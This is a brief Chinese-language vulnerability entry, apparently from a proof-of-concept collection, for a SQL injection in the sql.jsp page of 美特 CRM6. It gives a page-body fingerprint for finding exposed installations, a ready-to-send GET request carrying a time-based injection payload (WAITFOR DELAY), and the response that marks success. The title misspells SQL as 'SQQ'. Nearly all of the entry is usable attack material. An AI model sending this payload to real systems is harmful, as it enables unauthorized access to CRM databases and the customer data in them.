# 美特CRM6sql.jsp存在SQQ注入漏洞

美特 ｜ SQL注入 ｜ —
- **指纹**：`body="/common/scripts/basic.js"`
- **请求**：`GET /common/jsp/sql.jsp?sql=;WAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1`
- **响应特征**：200